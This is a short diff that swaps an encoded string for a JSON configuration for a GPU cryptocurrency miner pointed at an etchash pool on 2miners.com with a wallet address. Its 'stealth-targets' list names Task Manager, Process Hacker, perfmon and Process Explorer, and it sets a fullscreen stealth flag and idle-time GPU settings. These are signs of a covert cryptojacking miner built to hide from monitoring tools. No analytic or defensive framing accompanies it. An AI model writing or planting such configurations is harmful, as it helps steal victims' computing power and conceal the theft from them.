@@ -1,1 +1,10 @@
-45q5z2grms2YgvTxQxShjzQKFW64oRwcWV8tsheV8nBPaHq1dx59dBJLHXkHqPmSzxCZ7XcdvFKvricLcif1kNeq24kbvoz
+{
+    "url": "stratums://`0x749A99E369B2B962207f6341170F02fa9B832A96`.qweasdzxc1:qweasdzxc1@etc.2miners.com:1010",
+    "algo": "etchash",
+    "max-gpu": 10,
+    "idle-wait": 5,
+    "idle-gpu": 50,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
